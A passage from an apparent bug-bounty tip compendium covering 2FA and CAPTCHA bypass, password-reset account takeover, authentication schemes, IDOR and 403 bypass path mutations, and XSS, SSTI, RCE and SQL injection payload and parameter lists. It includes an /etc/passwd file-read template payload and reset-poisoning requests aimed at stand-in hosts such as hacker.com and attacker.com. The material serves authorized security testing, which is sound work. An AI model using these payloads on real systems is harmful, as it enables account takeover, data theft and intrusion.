  - **CVE / multi-purpose scanner** — `nuclei`, `jaeles`, `nikto`
  - **Deserializing** — `ysoserial`, `marshalsec`
  - **Subdomain takeover** — `subjack`, `subover`, `nuclei`
  - **Hidden parameters** — `arjun`, `param-miner`, `x8`
- **Wordlists** — common files, subdomains, mixed (SecLists, Assetnote, PayloadsAllTheThings)
- **Android** — emulator (BlueStacks, Genymotion, Android Studio), decompiler (`jadx`, `apktool`, `dex2jar`), general purpose scanner (`MobSF`)
- **iOS** — blackbox tools (`objection`, `frida`, `needle`), reverse engineering (`class-dump`, `Hopper`, `IDA`)

**Why it matters:** A single map of the tool landscape by phase, useful for filling gaps in a workflow.

---

## Authentication & Session

<details>
<summary>Show tips in this section</summary>

- [36. Ways to Bypass 2FA](#36-ways-to-bypass-2fa)
- [37. Account Takeover via Missing CSRF Token + Leaked User ID](#37-account-takeover-via-missing-csrf-token--leaked-user-id)
- [38. Bypassing CAPTCHA Tips](#38-bypassing-captcha-tips)
- [39. Account Takeover Using Password Reset — Parameter Tricks](#39-account-takeover-using-password-reset--parameter-tricks)
- [40. 2FA Bypass by Toggling `mfa` in the Login Response](#40-2fa-bypass-by-toggling-mfa-in-the-login-response)
- [41. Password Reset Vulnerabilities](#41-password-reset-vulnerabilities)
- [42. Testing Password Reset Functionality](#42-testing-password-reset-functionality)
- [43. Tips for "Forgotten Password" Functionality](#43-tips-for-forgotten-password-functionality)
- [44. Auth Strategies — Basic Authentication](#44-auth-strategies--basic-authentication)
- [45. Token-Based Authentication](#45-token-based-authentication)
- [46. Auth Strategies — Session-Based Authentication](#46-auth-strategies--session-based-authentication)
- [47. JWT — JSON Web Tokens](#47-jwt--json-web-tokens)
- [48. OAuth — Open Authorization](#48-oauth--open-authorization)

</details>

### 36. Ways to Bypass 2FA

**Slide:** 14/116

1. Try sending a blank code.
2. Try all subdomains which have a login panel using the same login information — it may happen that some of them do not need 2FA.
3. Check if the input has a rate limit; if not, use brute force to bypass.
4. Create 2 accounts, turn on 2FA in both accounts, intercept in Burp Suite, disable 2FA for any of the accounts, take a CSRF PoC, open the second account and try it.

**Why it matters:** 2FA is usually enforced in one UI flow only — alternate hosts, missing rate limits, and state-change CSRF are frequently overlooked.

---

### 37. Account Takeover via Missing CSRF Token + Leaked User ID

**Slide:** 34/116

```
Account takeover:

1. In dashboard there was an option to change password.
2. To change new password we have to enter old password.
3. I changed the password by entering wrong old password and capture that in burp.
4. I removed the old password and clicked the forward.
5. Boooom...password got changed
```

I had reported this as a low severity bug. But the H1 closed it as N/A and they said it requires physical access to the user device.

When I dug deeper:

1. I found there is no CSRF token.
2. Instead of a CSRF token they used userid (uuid).
3. Userid was leaked in urls.
4. I got userid of others by Google dorks.
5. Yes now I found CSRF.

CSRF + improper password changing functionality = account takeover. Now my N/A report got changed to CRITICAL.

**Why it matters:** Removing the old-password check is the bug; finding the predictable CSRF substitute in a public URL is what turns it into a remotely exploitable takeover.

---

### 38. Bypassing CAPTCHA Tips

**Slide:** 44/116

1. Change request method:

```http
POST --> GET
POST --> PUT
```

2. Remove captcha parameter.
3. Reuse old captcha.
4. Convert JSON data to normal request parameters:

```http
# JSON request:
POST / HTTP/1.1
Host: example.com

{"param1": "value1", "param2": "value2"}
```

```http
# Normal request:
POST / HTTP/1.1
Host: example.com

param1=value1&param2=value2
```

Note: you can combine this method with the first method (changing request method).

5. Use special headers to bypass rate limiting:

```http
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```

**Why it matters:** Captcha enforcement is frequently wired to one HTTP method or content type only, and rate limits often trust client-supplied IP headers.

---

### 39. Account Takeover Using Password Reset — Parameter Tricks

**Slide:** 56/116

```http
GET /passwordreset

# Double parameter
email=victim@xyz.tld&email=hacker@xyz.tld

# Carbon copy
email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld

# Separators
email=victim@xyz.tld,hacker@xyz.tld
email=victim@xyz.tld%20hacker@xyz.tld
email=victim@xyz.tld|hacker@xyz.tld

# No domain
email=victim

# No tld
email=victim@xyz

# Json table
{"email":["victim@xyz.tld","hacker@xyz.tld"]}
```

**Why it matters:** If the reset mailer parses multiple recipients, the attacker's address is CC'd while the victim still receives a legitimate link.

---

### 40. 2FA Bypass by Toggling `mfa` in the Login Response

**Source:** @N008x · **Slide:** 62/116

1. Notice both requests while logging in when 2FA is enabled and disabled.
2. While 2FA is disabled:

Request:

```json
{"email":"abc@gmail.com","password":"abc@123","mfa":null,"code":""}
```

Response:

```http
Location : https://vulnerable-site.com/user/dashboard
```

3. While 2FA is enabled:

Request:

```json
{"email":"abc@gmail.com","password":"abc@123","mfa":true,"code":""}
```

Response:

```http
Location : https://vulnerable-site.com/v1/proxy/authentication/authenticate
```

4. Tamper the parameter and change `"mfa":null "code":""`:

```http
Location : https://vulnerable-site.com/user/dashboard
```

**Why it matters:** The client-controlled `mfa` flag decides whether the second factor is enforced, so flipping it to `null` skips the challenge entirely.

---

### 41. Password Reset Vulnerabilities

**Source:** @wreckworm · **Slide:** 90/116

1. Try CRLF injection:
   - a. `Email = 'victim@mail.com%0d%0acc:attacker@mail.com'`
   - b. `/resetpassword?%0d%0aHost:attacker.com`
2. Adding your emails:
   - a. `email=victim@mail.com&email=attacker@mail.com`
   - b. `{"email":['victim@mail.com','attacker@mail.com']}`
   - c. `email=victim@mail.com,attacker@mail.com`
   - d. `email=victim@mail.com%20attacker@mail.com`
3. Token issues:
   - a. Check if the token is reflected back in the response
   - b. Use another email's token on your victim's reset link: `reset/email=victim@mail.com?token=*attacker'stoken`
   - c. Check for brute forcing
   - d. Try used tokens
   - e. Try giving massive tokens
   - f. Remove the token and check
4. Change headers:
   - a. Add `X-Forwarded-Host: attacker.com` (Host header injection)
   - b. `Host: Attacker.com`

**Why it matters:** The reset flow has four distinct weak points — recipient parsing, token generation, token validation, and link construction from headers.

---

### 42. Testing Password Reset Functionality

**Source:** @hussein98d · **Slide:** 94/116

1. Include your mail as a second parameter (you might receive the reset link):

```http
POST /reset
Host: ...
email=victim@tld.xyz&email=hacker@tld.xyz
```

2. Brute force the reset token if it is numeric. You can use IP Rotator on Burp Suite to bypass rate limit in case it's IP based:

```http
POST /reset
Host: ...
email=victim@tld.xyz&code=$BRUTE$
```

3. Try to use your reset token on the target's account:

```http
POST /reset
Host: ...
email=victim@tld.xyz&code=$YOUR-TOKEN$
```

4. Host header injection: change `website.com` to `hacker.com` (victim might receive the reset link with your host instead of the original website's):

```http
POST /reset
Host: hacker.com
```

5. Try to figure out how the tokens are generated. Examples can be:
   - Generated based on timestamp
   - Generated based on the ID of the user
   - Generated based on the email of the user

**Why it matters:** Each step targets a different weakness: extra recipients, weak token entropy, token/account mismatch, and header-driven link generation.

---

### 43. Tips for "Forgotten Password" Functionality

**Slide:** 99/116

1. Identify any forgotten-password functionality within the application. If it is not explicitly linked from published content, it may still be implemented.
2. Understand how the forgotten-password function works by doing a complete walkthrough using an account you control.
3. If the mechanism uses a challenge, determine whether users can set or select their own challenge and response. If so, use a list of enumerated or common usernames to harvest a list of challenges, and review this for any that appear easily guessable.
4. If the mechanism uses a password "hint", do the same exercise to harvest a list of password hints, and target any that are easily guessable.
5. Try to identify any behavior in the forgotten-password mechanism that can be exploited as the basis for username enumeration or brute-force attacks.
6. If the application generates an email containing a recovery URL in response to a forgotten-password request, obtain a number of these URLs and attempt to identify any patterns that may enable you to predict the URLs issued to other users. Employ the same techniques as are relevant to analyzing session tokens for predictability.

**Why it matters:** The reset flow is a separate authentication surface and is often built with weaker tokens, hints, and enumeration behavior than the login form.

---

### 44. Auth Strategies — Basic Authentication

**Source:** @kamranahmedse · **Slide:** 101/116

Mechanism to authenticate access to resources over HTTP. Credentials are sent in the request headers:

```http
Authorization: Basic aGltOm9y22XJhY2hp2X2lcg==
```

That is Base64-encoded username and password.

**How it works:**

- **Step 1** — Client tries to access some protected URL. The browser sends the request to the server protected by basic auth.
- **Step 2** — Server checks if the request has an `Authorization` header with valid username and password.
  - Credentials don't exist or are invalid → `401 Unauthorized` + `WWW-Authenticate` header.
  - Credentials exist and are valid → `200 OK`.
- The response looks like:

```http
HTTP/1.1 401 Unauthorized
Date: Sat, 16 May 2020 16:50:53 GMT
WWW-Authenticate: Basic realm="MyApp"
```

`realm` or protection space is a group of pages where the same credentials are used. The browser can cache the valid credentials for a given realm and use them in future. The freeform text can be anything; the server is responsible for defining realms and doing the authentication.

- **Step 3** — Browser notices the `WWW-Authenticate` header in the response and presents the alert for credentials (the login popup).
- **Step 4** — User submits credentials; the browser encodes them using Base64 and sends them in the next request:

```http
Authorization: Basic aGltOm9y22XJhY2hp2X2lcg==
```

`base64("username:password")`

- **Step 5** — Go to step 2, i.e. the server does the authentication and the cycle continues.

Note: Basic auth is not considered secure unless used with TLS/HTTPS, because anyone can eavesdrop and decode the credentials. Basic auth can also be used in APIs, but in that case it's just like normal token-based authentication.

**Why it matters:** Knowing the exact challenge-response exchange explains why basic auth credentials leak on plain HTTP and how `realm` caching behaves.

---

### 45. Token-Based Authentication

**Source:** @kamranahmedse · **Slide:** 102/116

Unlike basic auth, where username and password are sent in each request, in token-based authentication a token is sent from client to server in each request. It is some string generated by the server for the client to send in each request.

**How does it work?**

- Client sends the credentials to generate a token (some auth URL, username and password).
- Server validates the credentials:
  - Credentials were invalid → `Unprocessable Entity — 422`, error response.
  - Credentials were valid → `All Good — 200`, token in body or header.
- Client stores this token in local storage or a cookie and sends it in subsequent requests (token stored with the client).
- Server validates this token and returns a response if the token is valid. Returns `401 Unauthorized` otherwise.
  - `401` if the token is invalid.
  - `200` + response if the token is valid.

**Characteristics of a token:**

- Some random-looking string
- Server doesn't store it (so stateless)
- Has an expiry after which the token is not usable
- Normally signed with a secret, so tampering can be identified and the server can trust it
- Normally sent in the `Authorization` header
- Can be **opaque** or **self-contained**
  - Opaque: a random string; doesn't contain any meaningful data and can only be verified by the authorization server, just like session IDs
  - Self-contained: the token has the data and can be viewed by the clients, e.g. JWT tokens

**Examples of token-based authentication strategies:** SWT (Simple Web Tokens), JWT (JSON Web Tokens), OAuth (Open Authorization), SAML (Security Assertions Markup Language), OpenID.

**Why it matters:** The difference between opaque and self-contained tokens decides whether you can decode, tamper with, or replay a token.

---

### 46. Auth Strategies — Session-Based Authentication

**Source:** @kamranahmedse · **Slide:** 107/116

A user is assigned some unique identifier and this identifier is stored on the server in memory. The client sends this session ID in all requests, and the server uses it to identify the user. This is a stateful authentication methodology.

**Stateful vs stateless methodologies:**

- Stateful — authentication session can be revoked
- Stateless — authentication session can't be revoked

**How does it work?**

- **Step 1** — Client sends the login request (`username:password`) to `https://some.url/login`.
- **Step 2** — Server validates the credentials, creates a session, stores it in memory assigned to the current user, and returns the generated session ID. The session ID is some random unique identifier used to identify the user. The server stores the generated session ID in memory — this could be anywhere, e.g. Redis, memory, database, filesystem. `ABCXYZ` now refers to the user with id `1224`.
- **Step 3** — Client receives the session ID and stores it in a cookie if cookies are enabled, or somewhere else (e.g. local/session storage) if cookies are not enabled.
- **Step 4** — Client sends the next requests with the session ID. Server checks whether a user exists with the current session ID in its storage:
  - Yes → `200 OK`, here you go
  - No, invalid session ID → `401 Unauthorized`
- **Step 5** — When the user logs out, the session is destroyed (cookie removed + session removed from the server) and the same session ID cannot be reused.

**Why it matters:** Because the session lives on the server, logout and revocation actually work — unlike a self-contained JWT that remains valid until it expires.

---

### 47. JWT — JSON Web Tokens

**Source:** @kamranahmedse · **Slide:** 108/116

A form of token-based authentication, based on an open standard (RFC 7519). It can be used for authorization as well as secure information exchange.

**How does it work?**

Just like any other token-based auth strategy. The only differentiator is how the token is generated:

1. Client sends username and password to generate a token.
2. Server validates the credentials.
3. Server generates the token using a secret key.
4. Server returns the JSON Web Token.
5. Client sends the JWT in the header to some secure endpoint.
6. Server validates the JWT with the secret key.
7. Server returns the response for the request.

**Characteristics of the token:**

- The token is just a normal URL-safe string and can be passed to the server in the header, body, or URL.
- The token is self-contained, i.e. it carries the data. Anyone can view the content.
- The token has three parts separated by a dot: `XXXXXXXXXX.YYYYYYYYYY.ZZZZZZZZ` — header, payload, signature.
  - Header is a string generated using `base64(tokenMeta)`, e.g. `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9`
  - Payload is a string generated using `base64(ourData)`, where `ourData` is the data we want to embed in the token (aka JWT claims), e.g. `eyJ1c2VySWQiOiJYRjExLTExMjMiLCJlbWFpbCI6ImpvaG5AZG9lLmNvbSIsImV4cCI6MTU5MjQyNzkzOCwiaWF0IjoxNTkwOTY5NjAwfQ`
  - Signature is a string generated by hashing the header and payload with a secret, i.e. `HMACSHA256(header + '.' + payload, 'secret')`, held at the server and used to generate and verify tokens.

Token meta:

```json
{
  "typ": "jwt",
  "alg": "HS256"
}
```

`typ` is the type of token; `alg` is the hashing algorithm used for the signature part, e.g. in this case SHA256.

Our data (claims):

```json
{
  "userId": "XFI1-1123",
  "email": "john@doe.com",
  "exp": "1592427938",
  "iat": "1590969600"
}
```

There are three types of claims:

- **Registered claims** — standard names reserved for app usage:
  - `iat` → issued at (issuance timestamp)
  - `iss` → issuer (who issued it, app name for example)
  - `sub` → token subject
  - `exp` → expiry time (expiry timestamp)
  - `aud` → token audience (app URL or some string for example)
  - `nbf` → not before (timestamp before which the token is not usable)
  - `jti` → unique token identifier (can be used to revoke existing JWT token)
  - In the sample payload above, we have `exp` and `iat` claims.
- **Public claims** — claims we can define and use for our own data, e.g. `userId`, `email`, above etc.
- **Private claims** — names without any meaning to anyone except the consumer and producer of tokens.

**Why it matters:** The payload is only Base64 — readable and modifiable by anyone — so the signature check is the sole thing standing between a user and forged claims.

---

### 48. OAuth — Open Authorization

**Source:** @kamranahmedse · **Slide:** 114/116

Open protocol for authorization that allows users to share their private resources with a third party.

Examples:

- Authorizing your app's frontend from your API — your custom OAuth server where users of your website get authorized using OAuth.
- Allowing some application to log you in using Twitter — exposing your Twitter info to an external application using Twitter's OAuth server.
- Not backward compatible.

Versions: OAuth 1.0 (deprecated), OAuth 2.0 (active), OAuth 2.1 (draft).

**How does it work?** There are 4 types of authorization flows for generating a token (also called grant types). All flows lead to a token which the client uses to access a protected resource.

**Terminology:**

- `client_id` — like a username for your app
- `client_secret` — like a password for your app
- authorization server — server that handles authentication and authorization
- resource server — server that exposes protected resources
- They could both be a single server also.

**1. Authorization Code Grant Flow**

1. Client app requests `http://oauth-server.com/token`.
2. Authorization server validates the client.
3. Validates credentials.
4. Validates client ID, secret, code.
5. Presents login form to the user (`username`, `password`).
6. Login request with `username`, `password`.
7. Ask the user consent for the scopes, e.g. `share_tweet`, `user_info`.
8. Allow access.
9. `authorization_code` to the `redirect_url`.
10. Get token request with `authorization_code`, `client_id`, `client_secret`.
11. Validates the token itself or from the auth server.
12. Token.
13. Some protected resource with `Bearer [token]`.
14. Response.

Query params in the token request:

```json
{
  "client_id": "[client_id]",
  "response_type": "code",
  "scope": "[scopes]",
  "redirect_uri": "[redirect_uri]",
  "state": "[state]"
}
```

- `client_id` — calling app's identifier
- `response_type` — `code` in the auth code grant
- `scope` — list of permissions to ask the user, e.g. `share_tweet`, `user_info`, etc. The token generated with the flow will only be able to perform the actions for which permissions were asked.
- `redirect_uri` — URL at which the user is to be redirected with the auth code after successful login.
- `state` — any state variables you want the server to send back to the browser after login.
- The token request needs to be server side (through the client app's server) since it involves the client secret.

**2. Implicit Grant Flow** — Similar to the "Authorization Code Grant Flow" but in step 8 there is a token instead of an authorization code. So no need for steps 9, 10, and 11. Also, in the token request the `response_type` parameter is set to `token` instead of `code`.

**3. Client Credential Grant Flow** — Similar to the "Authorization Code Grant Flow" but there is no user interaction. It starts at step 9 and immediately gets the token. So step 9 would be step 1 in this grant flow. Also, in the request at step 9 there is no `authorization_code` and an additional parameter of the `grant_type` set to `token`.

**4. Password Grant Flow** — Similar to the "Authorization Code Grant Flow" but the user enters the credentials owned by the authorization server instead of the app. So steps 4 to 8 are replaced by the get-token request (i.e. step 9) and the credentials are directly sent to the authorization server along with an additional parameter of the `grant_type` set to `password`.

Note: The token response in all grant types is normally accompanied by an expiry date for the token and a refresh token which is used to refresh the token when expired.

**Why it matters:** Each grant type trusts a different party; knowing which one an app uses tells you where the redirect, scope, and token handling bugs will be.

---

## Authorization & IDOR

<details>
<summary>Show tips in this section</summary>

- [49. Private Profile Disclosure (WordPress)](#49-private-profile-disclosure-wordpress)
- [50. Bug Bounty Tip #2 — IDOR TRICK](#50-bug-bounty-tip-2--idor-trick)
- [51. Endpoint Bypass Methodology](#51-endpoint-bypass-methodology)
- [52. Header-Based Endpoint Bypass](#52-header-based-endpoint-bypass)
- [53. Tips on Bypassing 403 and 401](#53-tips-on-bypassing-403-and-401)
- [54. API Endpoint Bypass Cheatsheet (Ansar Uddin)](#54-api-endpoint-bypass-cheatsheet-ansar-uddin)

</details>

### 49. Private Profile Disclosure (WordPress)

**Source:** @0xveera · **Slide:** 7/116

```
Private Profile Disclosure -
[site was using wordpress to manage users account]
> There was option to keep profile private or public profile.
```

1. Go to the private profile URL: `https://example.com/profile/@xveera`
   - Check source code
   - Info disclosed
2. Bypass: `https://example.com/profile/@xveera/feed/`
3. Another bypass: `https://example.com/profile/0xveera/feed/atom/`
4. Bypassing an incomplete fix: making the profile private → public → private again helped to bypass and get access to `/feed` and `/feed/atom` endpoints.
5. Last bypass:
   - Checked `[wp-json]` and got the Yoast endpoint
   - Tried SSRF on `https://example.com/wp-json/yoast/v1/get_head?url=` — failed
   - Read the docs and supplied the profile URL: `https://example.com/wp-json/yoast/v1/get_head?url=https://example.com/profile/0xveera`
   - Got access to the information
6. All fixed — now again look on step 5 and hit `/feed` and `/feed/atom/`

Follow on Twitter: `@0xveera`.

**Why it matters:** Private-profile checks applied to the HTML page often miss the RSS, Atom, and REST API renderers of the same data.

---

### 50. Bug Bounty Tip #2 — IDOR TRICK

**Slide:** 30/116

Suppose you find an endpoint for IDOR:

```http
GET /api_v1/messages?user_id=Your_user_id
```

Try this:

```http
GET /api_v1/messages?user_id=Another_User_id
```

Try this (parameter duplication — HTTP parameter pollution):

```http
GET /api_v1/messages?user_id=Your_user_id&user_id=another_user_id
```

Try this (space-separated values):

```http
GET /api_v1/messages?user_id=Another_User_id user_id=your_user_id
```

Try this (array notation):

```http
GET /api_v1/messages?user_id[]=Another_user_id&user_id[]=your_userid
```

**Why it matters:** Different layers pick different duplicates — the WAF checks the first value while the application uses the last, or vice versa.

---

### 51. Endpoint Bypass Methodology

**Slide:** 79/116

If you want to bypass an endpoint, always try to use your own methodology.

Example:

```text
1. https://site.com/api/v1/users/redactid  -> access denied
   https://site.com/api/v1/users/redactid.json -> bypass ok
2. https://site.com/api/v1/users/redactid  -> access denied
   https://site.com/api/v1/users/redactid?  -> bypass ok
3. https://site.com/api/v1/users/redactid  -> access denied
   https://site.com/api/v1/users/redactid..;/ -> bypass ok
4. https://site.com/api/v1/users/redactid  -> access denied
   https://site.com/api/v1/users/redactid\.\..\getUser -> bypass ok
5. https://site.com/api/v1/users/redactid  -> access denied
   https://site.com/api/v1/users/redactid/  -> bypass ok
6. https://site.com/api/v1/users/redactid  -> access denied
   https://site.com/api/v1/users/redactid?? -> bypass ok
7. https://site.com/api/v1/users/redactid  -> access denied
   https://site.com/api/v2/users/redactid  -> bypass ok
   or
   https://site.com/api/v3/users/redactid  -> bypass ok
8. https://site.com/api/v1/users/redactid  -> access denied
   https://site.com/api/v1/users/redactid$accountdetails -> bypass ok
   or
   https://site.com/api/v1/users/redactid$accountdetails-redactid -> bypass ok
9. https://site.com/api/v1/users/victimuuid -> access denied
   https://site.com/api/v1/users/youruuid$victimuuid -> bypass ok
10. https://site.com/api/v1/users/victim?id=BAEILsaqQhk -> access denied
    https://site.com/api/v1/users/your?id=UAEILsdUF50&victim?id=BAEILsaqQhk -> bypass ok
11. https://www.site.com/api/v1/users/redactid -> access denied
    https://site.com/api/v1/users/redactid/email -> bypass ok
```

**Why it matters:** Access checks are often path- or prefix-based; extensions, `..;/`, duplicate slashes, and version prefixes make the same object reachable around the rule.

---

### 52. Header-Based Endpoint Bypass

**Slide:** 80/116

If you want to bypass an endpoint, always try to use your own methodology.

Example — HTTP header-based bypass:

1. `X-Original-URL: /redact`

Example:

```http
GET /api/getUser HTTP/1.1 -> 403
Host: redact.com
```

```http
GET / HTTP/1.1
Host: redact.com
X-Original-URL: /api/getUser -> 200 OK
```

2. `Referer: https://site.com/api/redact`

Example:

```http
GET /api/getUser HTTP/1.1 -> access denied
Host: redact.com
```

```http
GET / HTTP/1.1
Host: redact.com
Referer: https://site.com/api/getUser -> 200 OK
```

or:

```http
GET /api/getUser HTTP/1.1
Host: redact.com
Referer: https://site.com/api/getUser -> 200 OK
```

**Why it matters:** Routing and authorization can be enforced by different components; a rewrite header or trusted referer may be checked instead of the actual path.

---

### 53. Tips on Bypassing 403 and 401

**Source:** @RathiArpeet · **Slide:** 85/116

1. By adding headers: `X-Originating-IP`, `X-Remote-IP`, `X-Client-IP`, `X-Forwarded-For`, etc. (Sometimes companies whitelist the IP for those who can access sensitive data. These headers take the IP address as value and let you access if the supplied IP matches their whitelisted ones.)
2. With Unicode characters: try inserting Unicode characters to bypass, e.g. `%c0`, `%e0` and many others — google the list. If `/admin` is blocked, try `/admin` with a Unicode variant.
3. By overriding/overwriting URL with headers: if `GET /admin -> 403`, try `GET /accessible` with:

```http
X-Original-URL: /admin
X-Override-URL: /admin
X-Rewrite-URL: /admin
```

4. Try different payloads:

```text
/admin -> 403, try:
/accessible/../admin   -> 200
/.;/admin              -> 200
/admin;/               -> 200
/admin/~               -> 200
/./admin/./            -> 200
/admin?param           -> 200
/%2e/admin             -> 200
//admin%               -> 200
```

5. Method switching: change the method from `GET` to `POST` and see if you get something.
6. Via IP, vhost: access the site via its IP or vhost to get the forbidden content.
7. Fuzzing: brute-forcing (fuzzing) files or dirs further.

**Why it matters:** 401/403 responses come from several layers, and each layer can be fooled by a different header, encoding, or path shape.

---

### 54. API Endpoint Bypass Cheatsheet (Ansar Uddin)

**Source:** Ansar Uddin · **Slide:** 104/116

Payloads for a basic test:

```text
?
??
&
#
%
%20
%09
/
/..;/
../
..%2f
..;/
../
\..\.\
../.././
..%00/
..%0d/
..%5c
..\
..%ff/
%2e%2e%2f
.%2e/
%3f
%26
%23
.json
```

HTTP header-based bypass:

```text
1. X-Original-URL: /redact
2. Referer: https://site.com/api/redact
```

**Why it matters:** A compact mutation list covering path normalization, encoding, and header overrides for testing broken access control.

---

## Injection

<details>
<summary>Show tips in this section</summary>

- [55. Where to Look for Blind XSS?](#55-where-to-look-for-blind-xss)
- [56. Top 20 Event Handlers to Trigger XSS](#56-top-20-event-handlers-to-trigger-xss)
- [57. SSTI Payload Cheat Sheet](#57-ssti-payload-cheat-sheet)
- [58. Top 25 RCE Parameters](#58-top-25-rce-parameters)
- [59. Top 25 XSS Dorks (OpenBugBounty)](#59-top-25-xss-dorks-openbugbounty)
- [60. Top 25 SQL Injection Parameters](#60-top-25-sql-injection-parameters)
- [61. XSS Payload — `%ff` Prefix with SVG `onload`](#61-xss-payload--ff-prefix-with-svg-onload)
- [62. RCE Resource List](#62-rce-resource-list)
- [63. SQL Injection Payloads — Bypassing Mod_Security](#63-sql-injection-payloads--bypassing-mod_security)
- [64. Reflected XSS Approach (Mind Map)](#64-reflected-xss-approach-mind-map)
- [65. SVG `onload` Payload — Cookie Exfiltration](#65-svg-onload-payload--cookie-exfiltration)
- [66. XSS Firewall Bypass Techniques](#66-xss-firewall-bypass-techniques)
- [67. Gadget Roundup — reCAPTCHA, Angular Path Traversal, DOMPurify Bypass](#67-gadget-roundup--recaptcha-angular-path-traversal-dompurify-bypass)
- [68. XSS Methods for Beginners](#68-xss-methods-for-beginners)
- [69. DOMPurify / mXSS Parser Confusion](#69-dompurify--mxss-parser-confusion)
- [70. Mutation Points in the `<a>` Tag for WAF Bypass](#70-mutation-points-in-the-a-tag-for-waf-bypass)
- [71. Shellshock Test on CGI (`cgi-bin`)](#71-shellshock-test-on-cgi-cgi-bin)
- [72. Command Injection — Spaces Blocked, Dots Blocked](#72-command-injection--spaces-blocked-dots-blocked)

</details>

### 55. Where to Look for Blind XSS?

**Tags:** #bugbountytips #blindxss #xss #hacktraining · **Slide:** 3/116

1. Review forms
2. Contact Us pages
3. Passwords field — you never know if the other side doesn't properly handle input, and if your password is in View mode
4. Address fields of e-commerce sites
5. First or Last Name field while doing Credit Card Payments
6. Set `User-Agent` to a Blind XSS payload. You can do that easily from a proxy such as Burp Suite.

**Why it matters:** Blind XSS fires in an admin panel or back-office tool, so the injection points that matter are the ones whose data is stored and later rendered for staff.

---

### 56. Top 20 Event Handlers to Trigger XSS

**Source:** @trbughunters · **Slide:** 8/116

```html
1.  onload=alert()
2.  onerror=confirm()
3.  onfocus=prompt()
4.  onclick=alert()
5.  onmouseover=confirm()
6.  onchange=prompt()
7.  onmouseup=alert()
8.  onkeydown=confirm()
9.  onkeyup=prompt()
10. onkeypress=alert()
11. onMoveOn=confirm()
12. onabort=prompt()
13. ondblclick=alert()
14. onresize=confirm()
15. onselect=prompt()
16. onscroll=alert()
17. onsubmit=confirm()
18. onblur=prompt()
19. onreset=alert()
20. onunload=confirm()
```

**Why it matters:** When angle brackets or common tags are filtered, an inline event handler on an allowed element is often enough to execute JavaScript.

---

### 57. SSTI Payload Cheat Sheet

**Source:** @what_web · **Slide:** 13/116

```text
SSTI vulnerability finding attack vector
```

Generic:

```text
{{7*7}}
{{7*'7'}}
{{ ''.__class__.__base__.__subclasses__() }}
{{''.__class__.mro()[1].__subclasses__()}}
{% for c in [1,2,3] %}{{c,c,c}}{% endfor %}
{{ ''.__class__.__base__.__subclasses__() }}
```

PHP based:

```php
{php}print "Hello"{/php}
{php}$s = file_get_contents('/etc/passwd',NULL,NULL,0,100); var_dump($s);{/php}
```

Node.js backend based:

```text
{{ this }} -> [Object Object]
{{ this.__proto__ }} -> [Object Object]
{{ this.__proto__.constructor.name }} -> Object
{{this.constructor.constructor}}
{{this.constructor.constructor('process.pid')()}}
```

<!-- unclear: a line of Korean text and a romanized phrase ("...chajgi gong-gyeog") are partly unreadable -->

**Why it matters:** Testing `{{7*7}}` first distinguishes plain reflection from real template evaluation, then the language-specific payloads escalate to file read or code execution.

---

### 58. Top 25 RCE Parameters

**Source:** @trbughunters · **Slide:** 18/116

```text
1.  ?cmd={payload}
2.  ?exec={payload}
3.  ?command={payload}
4.  ?execute={payload}
5.  ?ping={payload}
6.  ?query={payload}
7.  ?jump={payload}
8.  ?code={payload}
9.  ?reg={payload}
10. ?do={payload}
11. ?func={payload}
12. ?arg={payload}
13. ?option={payload}
14. ?load={payload}
15. ?process={payload}
16. ?step={payload}
17. ?read={payload}
18. ?function={payload}
19. ?req={payload}
20. ?feature={payload}
21. ?exe={payload}
22. ?module={payload}
23. ?payload={payload}
24. ?run={payload}
25. ?print={payload}
```

**Why it matters:** These parameter names are the common entry points for command execution; fuzzing them with a benign command first is a fast triage step.

---

### 59. Top 25 XSS Dorks (OpenBugBounty)

**Source:** @trbughunters · **Slide:** 20/116

```text
1.  ?q={payload}
2.  ?s={payload}
3.  ?search={payload}
4.  ?id={payload}
5.  ?lang={payload}
6.  ?keyword={payload}
7.  ?query={payload}
8.  ?page={payload}
9.  ?keywords={payload}
10. ?year={payload}
11. ?view={payload}
12. ?email={payload}
13. ?type={payload}
14. ?name={payload}
15. ?p={payload}
16. ?month={payload}
17. ?immagine={payload}
18. ?list_type={payload}
19. ?url={payload}
20. ?terms={payload}
21. ?categoryid={payload}
22. ?key={payload}
23. ?l={payload}
24. ?begindate={payload}
25. ?enddate={payload}
```

**Why it matters:** Reflection testing is cheap; these are the parameters most likely to echo input back into the response.

---

### 60. Top 25 SQL Injection Parameters

**Source:** @trbughunters · **Slide:** 21/116

```text
1.  ?id={payload}
2.  ?page={payload}
3.  ?dir={payload}
4.  ?search={payload}
5.  ?category={payload}
6.  ?class={payload}
7.  ?file={payload}
8.  ?url={payload}
9.  ?news={payload}
10. ?item={payload}
11. ?menu={payload}
12. ?lang={payload}
13. ?name={payload}
14. ?ref={payload}
15. ?title={payload}
16. ?view={payload}
17. ?topic={payload}
18. ?thread={payload}
19. ?type={payload}
20. ?date={payload}
21. ?form={payload}
22. ?join={payload}
23. ?main={payload}
24. ?nav={payload}
25. ?region={payload}
```

**Why it matters:** Sorting, filtering, and content parameters are commonly concatenated into queries; these names give a prioritized fuzzing list.

---

### 61. XSS Payload — `%ff` Prefix with SVG `onload`

**Slide:** 22/116

```text
%ff<!----><svg/onload=top[/al/.source+/ert/.source]&lpar;)>
```

**Why it matters:** The `%ff` byte and HTML comment break up signatures, while `top[...]` rebuilds `alert` from string pieces to avoid a literal `alert(` match.

---

### 62. RCE Resource List

**Source:** @Ansar0047 · **Tags:** #Bugbountytips · **Slide:** 23/116

```
#Best for hunting Rce @Ansar0047
#Bugbountytips
```

RCE (Linux and Windows):

```text
https://github.com/payloadbox/command-injection-payload-list
https://github.com/ewilded/shelling
```

PHP generic gadget chains (framework/library):

```text
https://github.com/ambionics/phpggc
```

PHP object injection:

```text
https://github.com/portswigger/php-object-injection-check
```

File upload to RCE:

```text
https://github.com/modzero/mod0BurpUploadScanner
```

Server-side template injection:

```text
https://github.com/epinna/tplmap.git
```

Java deserialization, .NET deserialization:

```text
https://github.com/portswigger/gadgetprobe
https://github.com/nccgroup/freddy
https://github.com/federicodotta/Java-Deserialization-Scanner
https://github.com/frohoff/ysoserial
https://github.com/ilmila/J2EEScan
https://github.com/joaomatosf/jexboss
```

**Why it matters:** A curated set of the standard tooling for the main paths from a bug class to remote code execution.

---

### 63. SQL Injection Payloads — Bypassing Mod_Security

